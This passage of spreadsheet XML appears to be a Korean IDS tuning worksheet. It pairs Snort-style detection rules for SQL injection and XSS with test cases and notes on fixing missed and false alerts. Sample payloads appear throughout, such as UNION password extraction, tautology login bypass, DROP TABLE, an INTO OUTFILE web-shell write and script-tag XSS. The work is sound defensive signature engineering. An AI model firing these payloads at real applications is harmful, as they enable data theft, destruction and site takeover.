    <t>UNION 기반 SQLi(다른 테이블 컬럼을 결과에 결합해 탈취) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>UNION 기반 SQLi(다른 테이블 컬럼을 결과에 결합해 탈취) 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) keyword=' UNION SELECT pw FROM members--</t>
  </si>
  <si>
    <t>UNION 기반 SQLi(다른 테이블 컬럼을 결과에 결합해 탈취) 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] UNION SELECT (URI)"; flow:established,to_server; content:"union"; nocase; http_uri; content:"select"; nocase; http_uri; pcre:"/union\s+(all\s+)?select/U"; classtype:web-application-attack; sid:1000001; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">keyword=' UNION SELECT pw FROM members-- </t>
  </si>
  <si>
    <t>주재현</t>
  </si>
  <si>
    <t>T-004</t>
  </si>
  <si>
    <t>UNION 기반 SQLi(다른 테이블 컬럼을 결과에 결합해 탈취) — POST 본문 경로</t>
  </si>
  <si>
    <t>UNION 기반 SQLi(다른 테이블 컬럼을 결과에 결합해 탈취) 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) keyword=' UNION SELECT pw FROM members--</t>
  </si>
  <si>
    <t>UNION 기반 SQLi(다른 테이블 컬럼을 결과에 결합해 탈취) 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] UNION SELECT (body)"; flow:established,to_server; content:"union"; nocase; http_client_body; content:"select"; nocase; http_client_body; pcre:"/union\s+(all\s+)?select/P"; classtype:web-application-attack; sid:1000002; rev:1;)</t>
  </si>
  <si>
    <t>T-005</t>
  </si>
  <si>
    <t>항상참(tautology) 조건으로 인증/조회 우회 — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>항상참(tautology) 조건으로 인증/조회 우회 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) keyword=' OR '1'='1</t>
  </si>
  <si>
    <t>항상참(tautology) 조건으로 인증/조회 우회 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Tautology OR/AND condition (URI)"; flow:established,to_server; pcre:"/(\x27|\x22)\s*(or|and)\s+(\x27|\x22)?\w+(\x27|\x22)?\s*(=|like)\s*(\x27|\x22)?\w+/Ui"; classtype:web-application-attack; sid:1000003; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">keyword=' OR '1'='1 </t>
  </si>
  <si>
    <t>T-006</t>
  </si>
  <si>
    <t>항상참(tautology) 조건으로 인증/조회 우회 — POST 본문 경로</t>
  </si>
  <si>
    <t>따옴표로 감싼 '1'='1' 형태가 POST 로그인 본문에서 미탐(loginId=admin' OR '1'='1)</t>
  </si>
  <si>
    <t>[미탐→개선] 본문 tautology 패턴에 따옴표 피연산자 허용</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Tautology OR/AND condition (body)"; flow:established,to_server; pcre:"/(\x27|\x22)\s*(or|and)\s+(\x27|\x22)?\w+(\x27|\x22)?\s*(=|like)\s*(\x27|\x22)?\w+/Pi"; classtype:web-application-attack; sid:1000004; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">loginId=admin' OR '1'='1 본문 </t>
  </si>
  <si>
    <t>T-007</t>
  </si>
  <si>
    <t>OR/AND 뒤 서브쿼리 주입 — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>OR/AND 뒤 서브쿼리형 블라인드(xyz') OR (SELECT COUNT(*) FROM members)&gt;0) URL 경로 미탐</t>
  </si>
  <si>
    <t>[미탐→개선] 서브쿼리 주입 탐지 룰 신규(URL 파라미터)</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Subquery injection (OR/AND (SELECT)) (URI)"; flow:established,to_server; pcre:"/\b(or|and)\b\s+(not\s+)?\(?\s*\bselect\b/Ui"; classtype:web-application-attack; sid:1000005; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">keyword=xyz') OR (SELECT COUNT(*)...) </t>
  </si>
  <si>
    <t>T-008</t>
  </si>
  <si>
    <t>OR/AND 뒤 서브쿼리 주입 — POST 본문 경로</t>
  </si>
  <si>
    <t>동일 서브쿼리 주입이 POST 본문 경로로 유입 시 미탐</t>
  </si>
  <si>
    <t>[미탐→개선] 서브쿼리 주입 탐지 룰 신규(POST 본문)</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Subquery injection (OR/AND (SELECT)) (body)"; flow:established,to_server; pcre:"/\b(or|and)\b\s+(not\s+)?\(?\s*\bselect\b/Pi"; classtype:web-application-attack; sid:1000006; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">검색 POST 본문에 OR (SELECT COUNT(*)...) </t>
  </si>
  <si>
    <t>T-009</t>
  </si>
  <si>
    <t>Boolean 블라인드 추출함수(substring/ascii/count로 한 글자씩 노출) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>Boolean 블라인드 추출함수(substring/ascii/count로 한 글자씩 노출) 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) id=1 AND ASCII(SUBSTRING((SELECT pw),1,1))&gt;64</t>
  </si>
  <si>
    <t>Boolean 블라인드 추출함수(substring/ascii/count로 한 글자씩 노출) 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Boolean-blind extraction func (URI)"; flow:established,to_server; pcre:"/(\x27|\x22|\)|\d)\s*\b(and|or)\b\s+[^\x3b\x26]{0,60}?\b(substring|substr|mid|ascii|ord|length|char_length|left|right|count|unicode)\b\s*\(/Ui"; classtype:web-application-attack; sid:1000007; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">id=1 AND ASCII(SUBSTRING((SELECT pw),1,1))&gt;64 </t>
  </si>
  <si>
    <t>T-010</t>
  </si>
  <si>
    <t>Boolean 블라인드 추출함수(substring/ascii/count로 한 글자씩 노출) — POST 본문 경로</t>
  </si>
  <si>
    <t>Boolean 블라인드 추출함수(substring/ascii/count로 한 글자씩 노출) 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) id=1 AND ASCII(SUBSTRING((SELECT pw),1,1))&gt;64</t>
  </si>
  <si>
    <t>Boolean 블라인드 추출함수(substring/ascii/count로 한 글자씩 노출) 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Boolean-blind extraction func (body)"; flow:established,to_server; pcre:"/(\x27|\x22|\)|\d)\s*\b(and|or)\b\s+[^\x3b\x26]{0,60}?\b(substring|substr|mid|ascii|ord|length|char_length|left|right|count|unicode)\b\s*\(/Pi"; classtype:web-application-attack; sid:1000008; rev:1;)</t>
  </si>
  <si>
    <t>T-011</t>
  </si>
  <si>
    <t>Boolean 블라인드 비교/조건(AND 1=1 / CASE WHEN / IF) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>오탐</t>
  </si>
  <si>
    <t>저장형 XSS/클릭재킹 JS의 if(e===A)가 SQL IF(조건) 패턴에 매칭되어 URL 경로에서 SQLi 오탐</t>
  </si>
  <si>
    <t>[오탐→개선] IF()는 인자 쉼표를 가짐 → 비교+쉼표(함수형)만 탐지, CASE WHEN 길이 제한</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Boolean-blind comparison/conditional (URI)"; flow:established,to_server; pcre:"/(\b(and|or)\b\s+\d+\s*(=|&lt;|&gt;|&lt;=|&gt;=|&lt;&gt;|!=)\s*\d+|\bcase\s+when\b.{0,60}?\bthen\b|\b(if|iif)\s*\(\s*[^)\x3b,]{1,40}?(=|&lt;|&gt;|&lt;=|&gt;=|&lt;&gt;|!=)[^)\x3b]{0,40}?,)/Ui"; classtype:web-application-attack; sid:1000009; rev:1;)</t>
  </si>
  <si>
    <t>클릭재킹 JS → SQLi 0건 / IF(1=1,SLEEP(5),0) → 탐지 유지</t>
  </si>
  <si>
    <t>T-012</t>
  </si>
  <si>
    <t>Boolean 블라인드 비교/조건(AND 1=1 / CASE WHEN / IF) — POST 본문 경로</t>
  </si>
  <si>
    <t>동일 JS if() 오탐이 POST 본문 경로에서 발생</t>
  </si>
  <si>
    <t>[오탐→개선] 본문 IF() 패턴도 비교+쉼표(함수형)만 탐지하도록 한정</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Boolean-blind comparison/conditional (body)"; flow:established,to_server; pcre:"/(\b(and|or)\b\s+\d+\s*(=|&lt;|&gt;|&lt;=|&gt;=|&lt;&gt;|!=)\s*\d+|\bcase\s+when\b.{0,60}?\bthen\b|\b(if|iif)\s*\(\s*[^)\x3b,]{1,40}?(=|&lt;|&gt;|&lt;=|&gt;=|&lt;&gt;|!=)[^)\x3b]{0,40}?,)/Pi"; classtype:web-application-attack; sid:1000010; rev:1;)</t>
  </si>
  <si>
    <t>본문 JS if() → 0건 / 본문 IF(1=1,...,) → 탐지</t>
  </si>
  <si>
    <t>T-013</t>
  </si>
  <si>
    <t>시간기반 블라인드(응답 지연으로 참/거짓 판별) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>시간기반 블라인드(응답 지연으로 참/거짓 판별) 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) id=1 AND SLEEP(5) / WAITFOR DELAY '0:0:5'</t>
  </si>
  <si>
    <t>시간기반 블라인드(응답 지연으로 참/거짓 판별) 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Time-based blind (URI)"; flow:established,to_server; pcre:"/(sleep|benchmark|pg_sleep|dbms_lock\.sleep|dbms_pipe\.receive_message|waitfor\s+delay)\s*\(/Ui"; classtype:web-application-attack; sid:1000011; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">id=1 AND SLEEP(5) / WAITFOR DELAY '0:0:5' </t>
  </si>
  <si>
    <t>T-014</t>
  </si>
  <si>
    <t>시간기반 블라인드(응답 지연으로 참/거짓 판별) — POST 본문 경로</t>
  </si>
  <si>
    <t>시간기반 블라인드(응답 지연으로 참/거짓 판별) 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) id=1 AND SLEEP(5) / WAITFOR DELAY '0:0:5'</t>
  </si>
  <si>
    <t>시간기반 블라인드(응답 지연으로 참/거짓 판별) 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Time-based blind (body)"; flow:established,to_server; pcre:"/(sleep|benchmark|pg_sleep|dbms_lock\.sleep|dbms_pipe\.receive_message|waitfor\s+delay)\s*\(/Pi"; classtype:web-application-attack; sid:1000012; rev:1;)</t>
  </si>
  <si>
    <t>T-015</t>
  </si>
  <si>
    <t>에러기반 추출(DB 에러로 데이터 노출) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>Oracle 에러기반(CTXSYS.DRITHSX.SN, UTL_INADDR 등)이 URL 경로에서 미탐</t>
  </si>
  <si>
    <t>[미탐→개선] 에러기반 pcre에 Oracle/MSSQL 함수 추가</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Error-based extraction (URI)"; flow:established,to_server; pcre:"/(extractvalue|updatexml|exp\s*\(\s*~|floor\s*\(\s*rand|convert\s*\(.+using|ctxsys\.drithsx\.sn|utl_inaddr\.get_host_address|dbms_utility\.|xmltype\s*\(|utl_http\.request|to_char\s*\(\s*dbms_)/Ui"; classtype:web-application-attack; sid:1000013; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">status=x' AND CTXSYS.DRITHSX.SN(...) </t>
  </si>
  <si>
    <t>T-016</t>
  </si>
  <si>
    <t>에러기반 추출(DB 에러로 데이터 노출) — POST 본문 경로</t>
  </si>
  <si>
    <t>동일 Oracle 에러기반이 POST 본문 경로에서 미탐</t>
  </si>
  <si>
    <t>[미탐→개선] 본문 에러기반 pcre에 Oracle/MSSQL 함수 추가</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Error-based extraction (body)"; flow:established,to_server; pcre:"/(extractvalue|updatexml|exp\s*\(\s*~|floor\s*\(\s*rand|convert\s*\(.+using|ctxsys\.drithsx\.sn|utl_inaddr\.get_host_address|dbms_utility\.|xmltype\s*\(|utl_http\.request|to_char\s*\(\s*dbms_)/Pi"; classtype:web-application-attack; sid:1000014; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">본문 CTXSYS.DRITHSX.SN(...) </t>
  </si>
  <si>
    <t>T-017</t>
  </si>
  <si>
    <t>스택쿼리/DDL(; 뒤 DROP/INSERT 등 추가 구문) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>스택쿼리/DDL(; 뒤 DROP/INSERT 등 추가 구문) 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) id=1; DROP TABLE members--</t>
  </si>
  <si>
    <t>스택쿼리/DDL(; 뒤 DROP/INSERT 등 추가 구문) 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Stacked query / DDL (URI)"; flow:established,to_server; pcre:"/\x3b\s*(drop|insert|update|delete|create|alter|truncate|exec|merge|grant)\b/Ui"; classtype:web-application-attack; sid:1000015; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">id=1; DROP TABLE members-- </t>
  </si>
  <si>
    <t>T-018</t>
  </si>
  <si>
    <t>스택쿼리/DDL(; 뒤 DROP/INSERT 등 추가 구문) — POST 본문 경로</t>
  </si>
  <si>
    <t>스택쿼리/DDL(; 뒤 DROP/INSERT 등 추가 구문) 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) id=1; DROP TABLE members--</t>
  </si>
  <si>
    <t>스택쿼리/DDL(; 뒤 DROP/INSERT 등 추가 구문) 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Stacked query / DDL (body)"; flow:established,to_server; pcre:"/\x3b\s*(drop|insert|update|delete|create|alter|truncate|exec|merge|grant)\b/Pi"; classtype:web-application-attack; sid:1000016; rev:1;)</t>
  </si>
  <si>
    <t>T-019</t>
  </si>
  <si>
    <t>스키마/메타데이터 탐색(information_schema/dual 등) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>스키마/메타데이터 탐색(information_schema/dual 등) 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) id=1 UNION SELECT table_name FROM information_schema.tables--</t>
  </si>
  <si>
    <t>스키마/메타데이터 탐색(information_schema/dual 등) 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] DB metadata enumeration (URI)"; flow:established,to_server; pcre:"/(information_schema|sysobjects|sys\.tables|pg_catalog|all_tables|user_tables|all_objects|\bdual\b|msysobjects)/Ui"; classtype:web-application-attack; sid:1000017; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">id=1 UNION SELECT table_name FROM information_schema.tables-- </t>
  </si>
  <si>
    <t>T-020</t>
  </si>
  <si>
    <t>스키마/메타데이터 탐색(information_schema/dual 등) — POST 본문 경로</t>
  </si>
  <si>
    <t>스키마/메타데이터 탐색(information_schema/dual 등) 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) id=1 UNION SELECT table_name FROM information_schema.tables--</t>
  </si>
  <si>
    <t>스키마/메타데이터 탐색(information_schema/dual 등) 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] DB metadata enumeration (body)"; flow:established,to_server; pcre:"/(information_schema|sysobjects|sys\.tables|pg_catalog|all_tables|user_tables|all_objects|\bdual\b|msysobjects)/Pi"; classtype:web-application-attack; sid:1000018; rev:1;)</t>
  </si>
  <si>
    <t>T-021</t>
  </si>
  <si>
    <t>SQL로 서버 파일 입출력(LOAD_FILE/INTO OUTFILE) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>SQL로 서버 파일 입출력(LOAD_FILE/INTO OUTFILE) 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) id=1 INTO OUTFILE '/var/www/shell.php'</t>
  </si>
  <si>
    <t>SQL로 서버 파일 입출력(LOAD_FILE/INTO OUTFILE) 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] File access via SQL (URI)"; flow:established,to_server; pcre:"/(load_file\s*\(|into\s+(out|dump)file|utl_file\.)/Ui"; classtype:web-application-attack; sid:1000019; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">id=1 INTO OUTFILE '/var/www/shell.php' </t>
  </si>
  <si>
    <t>T-022</t>
  </si>
  <si>
    <t>SQL로 서버 파일 입출력(LOAD_FILE/INTO OUTFILE) — POST 본문 경로</t>
  </si>
  <si>
    <t>SQL로 서버 파일 입출력(LOAD_FILE/INTO OUTFILE) 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) id=1 INTO OUTFILE '/var/www/shell.php'</t>
  </si>
  <si>
    <t>SQL로 서버 파일 입출력(LOAD_FILE/INTO OUTFILE) 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] File access via SQL (body)"; flow:established,to_server; pcre:"/(load_file\s*\(|into\s+(out|dump)file|utl_file\.)/Pi"; classtype:web-application-attack; sid:1000020; rev:1;)</t>
  </si>
  <si>
    <t>T-023</t>
  </si>
  <si>
    <t>16진/CHAR()/CONCAT() 문자열 우회 인코딩 — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>16진/CHAR()/CONCAT() 문자열 우회 인코딩 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) id=0x61646d696e / CHAR(97,100,109,105,110)</t>
  </si>
  <si>
    <t>16진/CHAR()/CONCAT() 문자열 우회 인코딩 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Hex/char encoding evasion (URI)"; flow:established,to_server; pcre:"/(0x[0-9a-f]{6,}|\b(char|chr)\s*\(\s*\d+\s*(,\s*\d+\s*)*\)|concat\s*\()/Ui"; classtype:web-application-attack; sid:1000021; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">id=0x61646d696e / CHAR(97,100,109,105,110) </t>
  </si>
  <si>
    <t>T-024</t>
  </si>
  <si>
    <t>16진/CHAR()/CONCAT() 문자열 우회 인코딩 — POST 본문 경로</t>
  </si>
  <si>
    <t>16진/CHAR()/CONCAT() 문자열 우회 인코딩 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) id=0x61646d696e / CHAR(97,100,109,105,110)</t>
  </si>
  <si>
    <t>16진/CHAR()/CONCAT() 문자열 우회 인코딩 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Hex/char encoding evasion (body)"; flow:established,to_server; pcre:"/(0x[0-9a-f]{6,}|\b(char|chr)\s*\(\s*\d+\s*(,\s*\d+\s*)*\)|concat\s*\()/Pi"; classtype:web-application-attack; sid:1000022; rev:1;)</t>
  </si>
  <si>
    <t>T-025</t>
  </si>
  <si>
    <t>주석 회피(따옴표+--/#, MySQL /*!) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>JS 블록주석 /* */ 과 querySelector의 'select'가 결합되어 URL 경로에서 SQLi 오탐</t>
  </si>
  <si>
    <t>[오탐→개선] /* */·content:select 제거, 따옴표+라인주석(--,#)·MySQL 조건주석(/*!)만 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Comment evasion (quote+line-comment) (URI)"; flow:established,to_server; pcre:"/((\x27|\x22)\s*(\x2d\x2d[\s\x00#]|\x23)|\x2f\x2a\x21)/U"; classtype:web-application-attack; sid:1000023; rev:1;)</t>
  </si>
  <si>
    <t>클릭재킹 JS → 0건 / admin'-- → 신규 탐지</t>
  </si>
  <si>
    <t>T-026</t>
  </si>
  <si>
    <t>주석 회피(따옴표+--/#, MySQL /*!) — POST 본문 경로</t>
  </si>
  <si>
    <t>동일 JS 주석 오탐이 POST 본문 경로에서 발생</t>
  </si>
  <si>
    <t>[오탐→개선] 본문도 따옴표+라인주석·/*!만 탐지하도록 재설계</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[SQLi] Comment evasion (quote+line-comment) (body)"; flow:established,to_server; pcre:"/((\x27|\x22)\s*(\x2d\x2d[\s\x00#]|\x23)|\x2f\x2a\x21)/P"; classtype:web-application-attack; sid:1000024; rev:1;)</t>
  </si>
  <si>
    <t>본문 JS 주석 → 0건 / 본문 admin'-- → 탐지</t>
  </si>
  <si>
    <t>T-027</t>
  </si>
  <si>
    <t>[XSS] URL-encoded script tag — 원본 바이트(인코딩) 경로</t>
  </si>
  <si>
    <t>[XSS] URL-encoded script tag 공격을 시그니처로 탐지하지 못하면 미탐 — 원본 바이트(인코딩) 경로에 대한 탐지 커버리지 필요. 예)</t>
  </si>
  <si>
    <t>[XSS] URL-encoded script tag 시그니처를 정규화 버퍼(해당 버퍼)에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] URL-encoded script tag (raw)"; flow:established,to_server; content:"%3cscript"; nocase; fast_pattern; classtype:web-application-attack; sid:1001001; rev:1;)</t>
  </si>
  <si>
    <t>T-028</t>
  </si>
  <si>
    <t>&lt;script&gt; 태그 삽입 — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>&lt;script&gt; 태그 삽입 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;script&gt;alert(1)&lt;/script&gt;</t>
  </si>
  <si>
    <t>&lt;script&gt; 태그 삽입 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Script tag (URI)"; flow:established,to_server; pcre:"/&lt;\s*script[\s/&gt;]/Ui"; classtype:web-application-attack; sid:1001002; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">keyword=&lt;script&gt;alert(1)&lt;/script&gt; </t>
  </si>
  <si>
    <t>T-029</t>
  </si>
  <si>
    <t>&lt;script&gt; 태그 삽입 — POST 본문 경로</t>
  </si>
  <si>
    <t>&lt;script&gt; 태그 삽입 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;script&gt;alert(1)&lt;/script&gt;</t>
  </si>
  <si>
    <t>&lt;script&gt; 태그 삽입 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Script tag (body)"; flow:established,to_server; pcre:"/&lt;\s*script[\s/&gt;]/Pi"; classtype:web-application-attack; sid:1001003; rev:1;)</t>
  </si>
  <si>
    <t>T-030</t>
  </si>
  <si>
    <t>태그 이벤트핸들러(onerror/onload 등) XSS — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>태그 이벤트핸들러(onerror/onload 등) XSS 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;img src=x onerror=alert(1)&gt;</t>
  </si>
  <si>
    <t>태그 이벤트핸들러(onerror/onload 등) XSS 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Inline event handler (URI)"; flow:established,to_server; pcre:"/&lt;\s*[a-z][a-z0-9]*\b[^&gt;]*\son\w+\s*=/Ui"; classtype:web-application-attack; sid:1001004; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">keyword=&lt;img src=x onerror=alert(1)&gt; </t>
  </si>
  <si>
    <t>T-031</t>
  </si>
  <si>
    <t>태그 이벤트핸들러(onerror/onload 등) XSS — POST 본문 경로</t>
  </si>
  <si>
    <t>태그 이벤트핸들러(onerror/onload 등) XSS 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;img src=x onerror=alert(1)&gt;</t>
  </si>
  <si>
    <t>태그 이벤트핸들러(onerror/onload 등) XSS 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Inline event handler (body)"; flow:established,to_server; pcre:"/&lt;\s*[a-z][a-z0-9]*\b[^&gt;]*\son\w+\s*=/Pi"; classtype:web-application-attack; sid:1001005; rev:1;)</t>
  </si>
  <si>
    <t>T-032</t>
  </si>
  <si>
    <t>javascript:/vbscript:/data: 스킴 XSS — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>javascript:/vbscript:/data: 스킴 XSS 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) url=javascript:alert(1)</t>
  </si>
  <si>
    <t>javascript:/vbscript:/data: 스킴 XSS 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Dangerous URI scheme (URI)"; flow:established,to_server; pcre:"/(javascript|vbscript)\s*:|data\s*:\s*[^,]{0,40}?(script|base64)/Ui"; classtype:web-application-attack; sid:1001006; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">url=javascript:alert(1) </t>
  </si>
  <si>
    <t>T-033</t>
  </si>
  <si>
    <t>javascript:/vbscript:/data: 스킴 XSS — POST 본문 경로</t>
  </si>
  <si>
    <t>javascript:/vbscript:/data: 스킴 XSS 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) url=javascript:alert(1)</t>
  </si>
  <si>
    <t>javascript:/vbscript:/data: 스킴 XSS 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Dangerous URI scheme (body)"; flow:established,to_server; pcre:"/(javascript|vbscript)\s*:|data\s*:\s*[^,]{0,40}?(script|base64)/Pi"; classtype:web-application-attack; sid:1001007; rev:1;)</t>
  </si>
  <si>
    <t>T-034</t>
  </si>
  <si>
    <t>img/svg/iframe 등 태그 벡터 XSS — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>img/svg/iframe 등 태그 벡터 XSS 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;svg onload=alert(1)&gt;</t>
  </si>
  <si>
